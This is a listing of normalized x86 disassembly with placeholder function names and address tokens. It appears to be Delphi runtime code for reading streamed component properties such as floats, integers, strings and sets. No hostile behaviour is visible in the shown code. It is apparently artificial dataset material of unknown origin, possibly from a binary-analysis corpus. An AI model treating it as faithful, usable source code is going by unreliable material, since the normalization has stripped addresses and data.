call sub_416f7c
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41804c
mov eax [ ebp - 0x4 ]
call sub_417ee8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_403394
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_417c06
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_403394
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_416f7c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_417898
mov eax [ ebp - 0x4 ]
call sub_417ee8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417c0d
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_417c14
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_418d20
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_417e9c
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_4172e4
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
sub_417c58
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_418d20
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_417e9c
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_4172e4
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_417c9c
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_418d20
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_417e9c
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_4172e4
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_417cec
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_418d20
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_417e9c
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_4172e4
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_417d30
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_418d20
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_416dbc
mov al [ eax + lookup_table_417d57 ]
jmp [ eax * 4 + jump_table_417d65 ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_4172e4
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_403fd8
mov eax esi
call j_sub_4043b4
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_4172e4
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403f3c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403f3c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403f3c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403f3c
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_417e30
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_418d20
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_4172e4
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_4172e4
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_4172e4
jmp r-xdata
jmp r-xdata
call sub_416dbc
sub_417e9c
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_4172c0
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_417e30
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_418d20
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_4172e4
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_417ef0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_4172c0
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_418d20
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_417e30
mov [ edi ] eax
sub_417f30
push ebp
mov ebp esp
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_418021
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_403ee8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_403f80
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
call sub_403924
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418028
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4030e8
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40414c
sub_41804c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41821c
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_403764#3
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_418b44
xor edx edx
push ebp
push j_sub_403764#2
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
call sub_4041a8
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x70
push eax
mov ecx ebx
sub ecx edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_404408
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4033d8
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_410e14
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4033d8
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_410e14
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_4183d0
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_4172d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_4172d0
mov eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
call sub_403324
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x10 ]
call sub_410e84
mov [ ebp - 0x14 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_418030
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418223
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
mov edi ebx
jmp r-xdata
sub_4181e7
cmp [ eax + 0x78 ] 0x0
je r-xdata
call sub_40394c
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_4039a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418223
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
sub_41822c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_413a3c
mov ebx eax
test ebx ebx
je r-xdata
call sub_416dbc
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_410ef8
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_418274
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_416850
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_413eec
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4182b4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_418303
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_419438
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_411394
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41830a
lea eax [ ebp - 0x10 ]
call sub_40ef68
retn
sub_418310
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_4183c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4172c0
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_417d30
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_416850
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_413eec
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_418d20
lea eax [ ebp - 0x4 ]
call sub_405634
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_411448
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4183c9
lea eax [ ebp - 0x8 ]
call sub_403ee8
lea eax [ ebp - 0x4 ]
call sub_405634
retn
sub_4183d0
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4186cb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
xor eax eax
mov al [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4186d2
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_403f0c
lea eax [ ebp - 0x24 ]
call sub_4045c8
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403f0c
retn
jmp [ eax * 4 + jump_table_418460 ]
mov eax [ rw-data ]
call sub_416da4
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410e84
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4172c0
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_417380
xor ecx ecx
mov cl al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410ef8
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_417d30
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_410db0
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410ef8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417c14
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_411188
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_418b80
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_411088
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_418c3c
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4110b4
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418a64
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410ef8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4172c0
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4172c0
cmp al 0xd
jne r-xdata
push ebp
call sub_4182b4
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417e9c
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41140c
jmp r-xdata
push ebp
call sub_418310
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410e84
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_417e30
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410ef8
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_417d30
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41822c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418d20
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410ef8
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_417d30
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_418d20
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4113d4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418d20
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410e84
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4173d8
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4113d4
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_417d30
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_418274
pop ecx
jmp r-xdata
sub_4186d8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_403f3c
jmp r-xdata
mov eax [ ebx ]
call sub_413bd4
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408da0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418738
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418a53
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_418b20
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_418a31
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4189f2
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_418b44
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_418b44
mov eax [ ebp - 0x1c ]
call sub_413774
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_418b44
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_418b44
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_4186d8
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_418b44
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_4030e0
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4134c4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
xor eax eax
push ebp
push sub_418997
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_405d64
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_413eec
xor eax eax
push ebp
push sub_418977
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_4140f4
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41897e
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_403198
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_414098
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_4189c8
call sub_40276c
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_4039a0
jmp r-xdata
call sub_40394c
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_416acc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418a38
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_4189f7
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_416c74
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_40394c
call sub_4039a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418a38
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_403198
sub_418a64
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418b0e
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_418ae1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_418d20
cmp al 0xb
je r-xdata
mov eax ebx
call sub_410d58
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_416dbc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_416df4
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418b15
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418b44
cmp [ ebp - 0x8 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_418b44
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_4172e4
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_403fd8
mov eax esi
call j_sub_4043b4
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_4172e4
pop edx
pop esi
pop ebx
retn
sub_418b80
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_418c2d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4172c0
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_418c3c
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404170
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418c34
lea eax [ ebp - 0x8 ]
call sub_4045c8
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_418d20
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_4172e4
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404534
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_4172e4
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_4172e4
jmp r-xdata
jmp r-xdata
call sub_416dbc
sub_418c3c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_418d13
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4172c0
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_418b80
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404714
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418d1a
lea eax [ ebp - 0xc ]
call sub_403ee8
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_418d20
sub al 0x12
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_4172e4
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404810
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_4172e4
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_4172e4
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_404534
